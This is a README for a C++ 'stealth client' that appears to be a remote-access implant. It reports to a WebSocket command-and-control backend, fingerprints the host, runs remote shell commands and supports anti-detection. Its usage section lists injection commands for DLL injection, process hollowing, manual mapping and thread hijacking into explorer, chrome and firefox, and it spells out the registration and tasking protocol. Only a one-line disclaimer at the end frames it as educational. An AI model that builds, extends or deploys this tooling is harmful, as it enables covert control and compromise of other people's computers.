# LoopJS Stealth Client

Advanced C++ client implementation with stealth capabilities and process injection techniques.

## Features

- **WebSocket Communication**: Real-time connection to LoopJS backend
- **Process Injection**: Multiple injection techniques including:
  - DLL Injection
  - Process Hollowing
  - Manual DLL Mapping
  - Thread Hijacking
- **System Information Collection**: Comprehensive system profiling
- **Command Execution**: Both system commands and injection commands
- **Heartbeat Mechanism**: Maintains connection with backend
- **Auto-reconnection**: Automatic reconnection on disconnection

## Prerequisites

### Windows Development Environment
- Visual Studio 2019/2022 with C++ support
- CMake 3.16 or later
- Windows SDK

### Dependencies
- **libwebsockets**: WebSocket client library
- **nlohmann/json**: JSON parsing library

### Installing Dependencies

#### Using vcpkg (Recommended)
```bash
# Install vcpkg if not already installed
git clone https://github.com/Microsoft/vcpkg.git
cd vcpkg
.\bootstrap-vcpkg.bat

# Install dependencies
.\vcpkg install libwebsockets:x64-windows
.\vcpkg install nlohmann-json:x64-windows

# Integrate with Visual Studio
.\vcpkg integrate install
```

#### Manual Installation
1. Download libwebsockets from https://libwebsockets.org/
2. Download nlohmann/json from https://github.com/nlohmann/json
3. Build and install both libraries

## Building

### Using CMake (Recommended)
```bash
# Create build directory
mkdir build
cd build

# Configure
cmake .. -G "Visual Studio 16 2019" -A x64

# Build
cmake --build . --config Release
```

### Using Build Script
```bash
# Run the provided build script
build.bat
```

## Configuration

Edit `config.json` to customize client behavior:

```json
{
    "websocket": {
        "url": "ws://localhost:8080/ws",
        "reconnect_interval": 5,
        "auto_reconnect": true
    },
    "client": {
        "heartbeat_interval": 30,
        "command_timeout": 30,
        "max_output_size": 1048576
    },
    "injection": {
        "enabled": true,
        "methods": [
            "dll_injection",
            "process_hollowing", 
            "manual_mapping",
            "thread_hijacking"
        ]
    }
}
```

## Usage

### Running the Client
```bash
# From build directory
.\bin\Release\StealthClient.exe
```

### Command Types

#### System Commands
Standard Windows commands executed via cmd.exe:
```
whoami
systeminfo
ipconfig
dir C:\
```

#### Injection Commands
Advanced process injection techniques:
```
inject notepad.exe payload.dll dll_injection
inject explorer.exe payload.exe process_hollowing
inject chrome.exe payload.dll manual_mapping
inject firefox.exe shellcode.bin thread_hijacking
```

## Architecture

```
main.cpp
├── WebSocketClient (websocket_client.h/cpp)
│   ├── Connection management
│   ├── Message handling
│   └── Auto-reconnection
├── CommandHandler (command_handler.h/cpp)
│   ├── System command execution
│   ├── Injection command execution
│   └── Output capture
├── SystemInfoCollector (system_info.h/cpp)
│   ├── System profiling
│   ├── Machine fingerprinting
│   └── Capability detection
└── AdvancedInjection (core/injection.h)
    ├── Process hollowing
    ├── DLL injection
    ├── Manual DLL mapping
    └── Thread hijacking
```

## Protocol

The client communicates with the LoopJS backend using JSON messages over WebSocket:

### Registration
```json
{
    "type": "register",
    "uuid": "client-uuid",
    "machineFingerprint": "fingerprint",
    "computerName": "COMPUTER-NAME",
    "ipAddress": "192.168.1.100",
    "hostname": "COMPUTER-NAME",
    "platform": "Windows 10",
    "capabilities": ["execute_command", "process_injection"],
    "systemInfo": {...}
}
```

### Heartbeat
```json
{
    "type": "heartbeat",
    "uuid": "client-uuid",
    "systemInfo": {...}
}
```

### Command Response
```json
{
    "type": "output",
    "taskId": "task-id",
    "output": "command output",
    "status": "success|error",
    "timestamp": "2024-01-01T12:00:00.000Z"
}
```

## Security Features

- **Anti-Detection**: Built-in evasion techniques
- **Process Injection**: Multiple injection methods
- **Stealth Operation**: Minimal footprint
- **Encrypted Communication**: WebSocket over TLS (wss://)

## Development

### Project Structure
```
stealth-client/
├── main.cpp                 # Main entry point
├── websocket_client.h/cpp   # WebSocket implementation
├── command_handler.h/cpp    # Command execution
├── system_info.h/cpp       # System information
├── core/
│   └── injection.h         # Injection techniques
├── CMakeLists.txt          # Build configuration
├── config.json             # Configuration file
├── build.bat               # Build script
└── README.md               # This file
```

### Adding New Injection Methods
1. Add method declaration to `AdvancedInjection` class in `core/injection.h`
2. Implement method in `core/injection.h`
3. Add command parsing in `CommandHandler::ExecuteInjectionCommand()`
4. Update capabilities in `SystemInfoCollector::GetCapabilities()`

## Troubleshooting

### Common Issues

1. **Build Errors**
   - Ensure all dependencies are installed
   - Check CMake configuration
   - Verify Visual Studio version compatibility

2. **Connection Issues**
   - Verify backend is running on localhost:8080
   - Check firewall settings
   - Ensure WebSocket endpoint is accessible

3. **Injection Failures**
   - Run as Administrator for system-level operations
   - Verify target process exists
   - Check payload file paths

### Debug Mode
Compile in Debug mode for detailed logging:
```bash
cmake .. -DCMAKE_BUILD_TYPE=Debug
cmake --build . --config Debug
```

## Legal Notice

This software is for educational and authorized testing purposes only. Users are responsible for compliance with applicable laws and regulations.